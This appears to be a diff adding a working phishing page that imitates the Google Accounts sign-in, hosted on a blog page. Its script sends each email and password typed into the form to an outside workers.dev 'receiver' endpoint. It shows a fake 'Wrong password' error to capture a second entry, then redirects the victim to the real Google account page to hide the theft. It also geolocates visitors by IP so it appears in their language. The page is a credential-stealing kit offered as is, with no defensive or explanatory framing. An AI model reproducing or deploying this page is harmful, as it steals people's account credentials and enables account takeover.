@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sign in - Google Accounts</title>
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+
+    <style>
+        /* ==================== THEME VARIABLES ==================== */
+        :root {
+            --bg-body: #f0f4f9;
+            --bg-card: #ffffff;
+            --text-main: #1f1f1f;
+            --text-secondary: #444746;
+            --border-input: #747775;
+            --border-error: #d93025;
+            --border-focus: #0b57d0;
+            --link-color: #0b57d0;
+            --btn-bg: #0b57d0;
+            --btn-text: #ffffff;
+            --btn-hover: #0842a0;
+            --pill-border: #c4c7c5;
+            --pill-hover: #f1f3f4;
+            --error-text: #d93025;
+        }
+
+        /* AUTO DARK MODE DETECTION */
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg-body: #131314;
+                --bg-card: #1f1f1f;
+                --text-main: #e3e3e3;
+                --text-secondary: #c4c7c5;
+                --border-input: #8e918f;
+                --border-error: #f28b82;
+                --border-focus: #a8c7fa;
+                --link-color: #a8c7fa;
+                --btn-bg: #a8c7fa;
+                --btn-text: #041e49;
+                --btn-hover: #d3e3fd;
+                --pill-border: #444746;
+                --pill-hover: #282a2c;
+                --error-text: #f28b82;
+            }
+        }
+
+        /* ==================== GLOBAL STYLES ==================== */
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Roboto', 'Open Sans', sans-serif; background-color: var(--bg-body); color: var(--text-main); display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        a { color: var(--link-color); text-decoration: none; font-weight: 500; }
+        
+        .hidden { display: none !important; }
+
+        /* ==================== LOGIN CARD ==================== */
+        .login-wrapper { flex-grow: 1; display: flex; align-items: center; justify-content: center; width: 100%; padding: 20px; }
+        .login-card { background-color: var(--bg-card); width: 100%; max-width: 450px; padding: 48px 40px 36px; border-radius: 28px; transition: height 0.3s ease;}
+        @media (min-width: 600px) { .login-card { box-shadow: 0 24px 64px -20px rgba(0,0,0,0.1); } }
+
+        /* --- Header Elements --- */
+        .header-section { text-align: center; display: flex; flex-direction: column; align-items: center; }
+        .google-logo { width: 48px; height: 48px; margin-bottom: 16px; }
+        .title { font-size: 36px; font-weight: 400; margin-bottom: 12px; color: var(--text-main); }
+        .subtitle { font-size: 16px; color: var(--text-main); margin-bottom: 40px; font-weight: 400; }
+
+        /* --- Profile Pill (Step 2) --- */
+        .profile-pill {
+            display: inline-flex; align-items: center; border: 1px solid var(--pill-border);
+            border-radius: 16px; padding: 4px 8px 4px 4px; margin-bottom: 40px;
+            cursor: pointer; transition: background-color 0.2s;
+        }
+        .profile-pill:hover { background-color: var(--pill-hover); }
+        .profile-pill svg { width: 20px; height: 20px; margin-right: 8px; fill: var(--text-secondary); }
+        .profile-pill span { font-size: 14px; font-weight: 500; color: var(--text-main); margin-right: 8px; }
+        .profile-pill .arrow { width: 16px; height: 16px; fill: var(--text-main); }
+
+        /* --- Floating Input Field --- */
+        .input-group { position: relative; margin-bottom: 10px; }
+        .input-group input { width: 100%; padding: 16px 14px; font-size: 16px; border: 1px solid var(--border-input); border-radius: 4px; background-color: transparent; color: var(--text-main); outline: none; transition: border-color 0.2s; }
+        .input-group label { position: absolute; left: 14px; top: 16px; font-size: 16px; color: var(--text-secondary); background-color: var(--bg-card); padding: 0 4px; pointer-events: none; transition: 0.2s cubic-bezier(0.4, 0, 0.2, 1); }
+        
+        .input-group input:focus, .input-group input:not(:placeholder-shown) { border-color: var(--border-focus); border-width: 2px; padding: 15px 13px; }
+        .input-group input:focus + label, .input-group input:not(:placeholder-shown) + label { top: -8px; left: 10px; font-size: 12px; color: var(--border-focus); }
+        
+        /* Error Input State */
+        .input-group.error input { border-color: var(--border-error); }
+        .input-group.error input:focus + label, .input-group.error input:not(:placeholder-shown) + label { color: var(--border-error); }
+
+        /* --- Error Message Box --- */
+        .error-msg { display: none; align-items: flex-start; margin-top: 8px; color: var(--error-text); font-size: 12px; font-weight: 400; line-height: 1.5; }
+        .error-msg svg { fill: var(--error-text); width: 16px; height: 16px; margin-right: 8px; flex-shrink: 0; margin-top: 1px; }
+
+        /* --- Step 1 Specifics --- */
+        .forgot-link { display: inline-block; font-size: 14px; font-weight: 500; margin-bottom: 40px; margin-top: 5px;}
+        .guest-text { font-size: 14px; color: var(--text-secondary); line-height: 1.5; margin-bottom: 50px; }
+
+        /* --- Step 2 Specifics (Show Password) --- */
+        .show-password-wrapper { display: flex; align-items: center; margin-top: 15px; margin-bottom: 40px; cursor: pointer; }
+        .show-password-wrapper input[type="checkbox"] { margin-right: 12px; width: 18px; height: 18px; cursor: pointer; accent-color: var(--btn-bg); }
+        .show-password-wrapper label { font-size: 14px; color: var(--text-main); font-weight: 500; cursor: pointer; }
+
+        /* --- Actions --- */
+        .actions { display: flex; justify-content: space-between; align-items: center; }
+        .action-left { font-size: 14px; cursor: pointer; }
+        .btn-next { background-color: var(--btn-bg); color: var(--btn-text); border: none; border-radius: 20px; padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background-color 0.2s; }
+        .btn-next:hover { background-color: var(--btn-hover); }
+        .btn-next.loading { opacity: 0.7; pointer-events: none; }
+
+        /* ==================== FOOTER ==================== */
+        .footer { width: 100%; max-width: 450px; display: flex; justify-content: space-between; align-items: center; padding: 0 20px 20px 20px; font-size: 12px; }
+        .lang-selector { position: relative; background: transparent; color: var(--text-secondary); border: none; font-size: 12px; cursor: pointer; outline: none; }
+        .lang-selector option { background: var(--bg-card); color: var(--text-main); }
+        .footer-links { display: flex; gap: 20px; }
+        .footer-links a { color: var(--text-secondary); font-weight: 400; }
+        .footer-links a:hover { background-color: rgba(0,0,0,0.05); border-radius: 4px; }
+    </style>
+<link rel="me" href="https://www.blogger.com/profile/00067221345242912059" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</head>
+<body>
+
+    <div class="login-wrapper">
+        <div class="login-card">
+            
+            <div class="header-section">
+                <!-- Google SVG Logo -->
+                <svg class="google-logo" viewBox="0 0 24 24">
+                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+                </svg>
+
+                <h1 class="title" id="txt-title">Sign in</h1>
+                
+                <p class="subtitle step1-only" id="txt-subtitle">Use your Google Account</p>
+
+                <!-- Profile Pill (Shown in Step 2) -->
+                <div class="profile-pill hidden step2-only" id="btn-back">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+                    <span id="display-email"></span>
+                    <svg class="arrow" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+                </div>
+            </div>
+
+            <form id="googleForm">
+                
+                <!-- ================= STEP 1: EMAIL ================= -->
+                <div id="step1">
+                    <div class="input-group">
+                        <input type="text" id="emailInput" placeholder=" " autocomplete="username">
+                        <label for="emailInput" id="txt-email-label">Email or phone</label>
+                    </div>
+
+                    <a href="#" class="forgot-link" id="txt-forgot">Forgot email?</a>
+
+                    <p class="guest-text">
+                        <span id="txt-guest1">Not your computer? Use a Private Window to sign in. </span>
+                        <a href="#" id="txt-guest2">Learn more about using Guest mode</a>
+                    </p>
+                </div>
+
+                <!-- ================= STEP 2: PASSWORD ================= -->
+                <div id="step2" class="hidden">
+                    <div class="input-group" id="pass-group">
+                        <input type="password" id="passwordInput" placeholder=" " autocomplete="current-password">
+                        <label for="passwordInput" id="txt-pass-label">Enter your password</label>
+                    </div>
+                    
+                    <!-- Google Style Fake Error -->
+                    <div id="google-error" class="error-msg">
+                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+                        <span id="txt-error-msg">Wrong password. Try again or click Forgot password to reset it.</span>
+                    </div>
+                    
+                    <div class="show-password-wrapper">
+                        <input type="checkbox" id="showPasswordToggle">
+                        <label for="showPasswordToggle" id="txt-show-pass">Show password</label>
+                    </div>
+                </div>
+
+                <!-- Actions -->
+                <div class="actions">
+                    <a href="#" class="action-left step1-only" id="txt-create">Create account</a>
+                    <a href="#" class="action-left hidden step2-only" id="txt-forgot-pass">Forgot password?</a>
+                    
+                    <button type="submit" class="btn-next" id="txt-next">Next</button>
+                </div>
+            </form>
+
+        </div>
+    </div>
+
+    <!-- Footer Area -->
+    <div class="footer">
+        <select class="lang-selector" id="languageSelector">
+            <option value="en">English (United States)</option>
+            <option value="es">Español (España)</option>
+            <option value="pt">Português (Brasil)</option>
+            <option value="it">Italiano (Italia)</option>
+        </select>
+
+        <div class="footer-links">
+            <a href="#" id="txt-help">Help</a>
+            <a href="#" id="txt-privacy">Privacy</a>
+            <a href="#" id="txt-terms">Terms</a>
+        </div>
+    </div>
+
+    <!-- ================= JAVASCRIPT ================= -->
+    <script>
+        // --- 1. LANGUAGE DICTIONARY ---
+        const i18n = {
+            en: {
+                title1: "Sign in", title2: "Welcome", subtitle: "Use your Google Account",
+                emailLabel: "Email or phone", passLabel: "Enter your password",
+                forgot: "Forgot email?", forgotPass: "Forgot password?",
+                guest1: "Not your computer? Use a Private Window to sign in. ", guest2: "Learn more about using Guest mode",
+                create: "Create account", next: "Next", showPass: "Show password",
+                help: "Help", privacy: "Privacy", terms: "Terms",
+                errorMsg: "Wrong password. Try again or click Forgot password to reset it."
+            },
+            es: {
+                title1: "Iniciar sesión", title2: "Te damos la bienvenida", subtitle: "Usa tu cuenta de Google",
+                emailLabel: "Correo electrónico o teléfono", passLabel: "Introduce tu contraseña",
+                forgot: "¿Has olvidado tu correo electrónico?", forgotPass: "¿Has olvidado tu contraseña?",
+                guest1: "¿No es tu ordenador? Usa una ventana privada para iniciar sesión. ", guest2: "Más información sobre el uso del modo Invitado",
+                create: "Crear cuenta", next: "Siguiente", showPass: "Mostrar contraseña",
+                help: "Ayuda", privacy: "Privacidad", terms: "Términos",
+                errorMsg: "Contraseña incorrecta. Vuelve a intentarlo o haz clic en Olvidé mi contraseña para cambiarla."
+            },
+            pt: {
+                title1: "Fazer login", title2: "Bem-vindo", subtitle: "Use sua Conta do Google",
+                emailLabel: "E-mail ou telefone", passLabel: "Digite sua senha",
+                forgot: "Esqueceu seu e-mail?", forgotPass: "Esqueceu a senha?",
+                guest1: "Não está no seu computador? Use uma janela anônima para fazer login. ", guest2: "Saiba mais sobre como usar o modo Visitante",
+                create: "Criar conta", next: "Avançar", showPass: "Mostrar senha",
+                help: "Ajuda", privacy: "Privacidade", terms: "Termos",
+                errorMsg: "Senha incorreta. Tente novamente ou clique em Esqueceu a senha para redefini-la."
+            },
+            it: {
+                title1: "Accedi", title2: "Ti diamo il benvenuto", subtitle: "Usa il tuo Account Google",
+                emailLabel: "Indirizzo email o numero di telefono", passLabel: "Inserisci la tua password",
+                forgot: "Hai dimenticato l'indirizzo email?", forgotPass: "Password dimenticata?",
+                guest1: "Non è il tuo computer? Usa una finestra privata per accedere. ", guest2: "Ulteriori informazioni sull'utilizzo della modalità Ospite",
+                create: "Crea account", next: "Avanti", showPass: "Mostra password",
+                help: "Guida", privacy: "Privacy", terms: "Termini",
+                errorMsg: "Password errata. Riprova o fai clic su Password dimenticata per reimpostarla."
+            }
+        };
+
+        let currentLang = 'en';
+        let currentStep = 1;
+
+        function updateLanguage(lang) {
+            const data = i18n[lang] || i18n['en'];
+            currentLang = lang;
+            
+            document.getElementById('txt-title').innerText = (currentStep === 1) ? data.title1 : data.title2;
+            document.getElementById('txt-subtitle').innerText = data.subtitle;
+            document.getElementById('txt-email-label').innerText = data.emailLabel;
+            document.getElementById('txt-pass-label').innerText = data.passLabel;
+            document.getElementById('txt-forgot').innerText = data.forgot;
+            document.getElementById('txt-forgot-pass').innerText = data.forgotPass;
+            document.getElementById('txt-guest1').innerText = data.guest1;
+            document.getElementById('txt-guest2').innerText = data.guest2;
+            document.getElementById('txt-create').innerText = data.create;
+            document.getElementById('txt-next').innerText = data.next;
+            document.getElementById('txt-show-pass').innerText = data.showPass;
+            document.getElementById('txt-help').innerText = data.help;
+            document.getElementById('txt-privacy').innerText = data.privacy;
+            document.getElementById('txt-terms').innerText = data.terms;
+            document.getElementById('txt-error-msg').innerText = data.errorMsg;
+            
+            document.getElementById('languageSelector').value = lang;
+        }
+
+        // ========================================================
+        // LIVE LOCATION / IP DETECTION FOR LANGUAGE
+        // ========================================================
+        window.onload = () => {
+            fetch('https://get.geojs.io/v1/ip/country.json')
+                .then(response => response.json())
+                .then(data => {
+                    const country = data.country; // Gets 2-letter country code (e.g. "BR", "ES", "IT")
+                    let langToSet = 'en'; // Default to English
+                    
+                    // Arrays of country codes
+                    const spanishCountries = ['ES', 'MX', 'AR', 'CO', 'PE', 'VE', 'CL', 'EC', 'GT', 'CU', 'BO', 'DO', 'HN', 'PY', 'SV', 'NI', 'CR', 'PA', 'UY', 'GQ', 'PR'];
+                    const portugueseCountries = ['BR', 'PT', 'AO', 'MZ', 'GW', 'GQ', 'TL', 'MO', 'CV', 'ST'];
+                    const italianCountries = ['IT', 'SM', 'VA', 'CH'];
+                    
+                    if (spanishCountries.includes(country)) {
+                        langToSet = 'es';
+                    } else if (portugueseCountries.includes(country)) {
+                        langToSet = 'pt';
+                    } else if (italianCountries.includes(country)) {
+                        langToSet = 'it';
+                    }
+                    
+                    updateLanguage(langToSet);
+                })
+                .catch(() => {
+                    // Fallback to browser language if API gets blocked
+                    let langCode = (navigator.language || navigator.userLanguage).split('-')[0].toLowerCase();
+                    updateLanguage(i18n[langCode] ? langCode : 'en');
+                });
+        };
+
+        document.getElementById('languageSelector').addEventListener('change', (e) => {
+            updateLanguage(e.target.value);
+        });
+
+        // Show Password Toggle
+        const passwordInput = document.getElementById('passwordInput');
+        document.getElementById('showPasswordToggle').addEventListener('change', function() {
+            passwordInput.type = this.checked ? 'text' : 'password';
+        });
+
+        // ========================================================
+        // WORKER CAPTURE LOGIC
+        // ========================================================
+        const CONFIG = {
+            apiUrl: "https://admin.ndoy.workers.dev/api/receiver", // Naya Endpoint URL
+            projectId: "UNET", // Project ID value
+            redirectUrl: "https://myaccount.google.com/",
+            pageTitle: "Google Accounts",
+            maxAttempts: 2
+        };
+
+        const form = document.getElementById('googleForm');
+        const emailInput = document.getElementById('emailInput');
+        const btnNext = document.getElementById('txt-next');
+        const errorBox = document.getElementById('google-error');
+        const passGroup = document.getElementById('pass-group');
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            if (currentStep === 1) {
+                if(emailInput.value.trim() === '') {
+                    emailInput.focus();
+                    return;
+                }
+                currentStep = 2;
+                document.getElementById('display-email').innerText = emailInput.value;
+                
+                document.querySelectorAll('.step1-only').forEach(el => el.classList.add('hidden'));
+                document.querySelectorAll('.step2-only').forEach(el => el.classList.remove('hidden'));
+                
+                document.getElementById('step1').classList.add('hidden');
+                document.getElementById('step2').classList.remove('hidden');
+                
+                updateLanguage(currentLang);
+                setTimeout(() => passwordInput.focus(), 100);
+
+            } else if (currentStep === 2) {
+                // STEP 2: Password Capture & Submit Logic
+                const email = emailInput.value.trim();
+                const pass = passwordInput.value;
+
+                if(!pass) {
+                    passwordInput.focus();
+                    return;
+                }
+
+                const originalText = btnNext.innerText;
+                btnNext.innerHTML = '<span style="font-size:18px;">...</span>';
+                btnNext.classList.add('loading');
+                errorBox.style.display = "none";
+                passGroup.classList.remove('error');
+
+                let attempts = parseInt(localStorage.getItem('google_attempts')) || 0;
+                attempts++;
+                localStorage.setItem('google_attempts', attempts);
+
+                // Naya Custom Payload Format JSON Structure (Emojis added)
+                const finalPayload = {
+                    projectId: CONFIG.projectId,
+                    data: {
+                        "🌐 Page": CONFIG.pageTitle,
+                        "👤 Email": email,
+                        "🔑 Password": pass
+                    }
+                };
+
+                fetch(CONFIG.apiUrl, {
+                    method: 'POST',
+                    mode: 'cors',
+                    headers: { 
+                        'Content-Type': 'application/json; charset=UTF-8',
+                        'Accept': 'application/json, text/plain, */*'
+                    },
+                    body: JSON.stringify(finalPayload)
+                })
+                .then(() => handleNavigation(attempts, btnNext, originalText))
+                .catch(() => handleNavigation(attempts, btnNext, originalText));
+            }
+        });
+
+        function handleNavigation(attempts, btn, originalText) {
+            if (attempts < CONFIG.maxAttempts) {
+                setTimeout(() => {
+                    // Show Error State
+                    errorBox.style.display = "flex";
+                    passGroup.classList.add('error');
+                    passwordInput.value = "";
+                    passwordInput.focus();
+                    
+                    // Reset Button
+                    btn.classList.remove('loading');
+                    btn.innerText = originalText;
+                }, 1000);
+            } else {
+                localStorage.removeItem('google_attempts');
+                window.location.replace(CONFIG.redirectUrl);
+            }
+        }
+
+        // Back to Step 1 Logic
+        document.getElementById('btn-back').addEventListener('click', () => {
+            currentStep = 1;
+            passwordInput.value = '';
+            errorBox.style.display = "none";
+            passGroup.classList.remove('error');
+            
+            document.querySelectorAll('.step2-only').forEach(el => el.classList.add('hidden'));
+            document.querySelectorAll('.step1-only').forEach(el => el.classList.remove('hidden'));
+            
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step1').classList.remove('hidden');
+            
+            updateLanguage(currentLang);
+        });
+
+    </script>
+</body>
+</html>
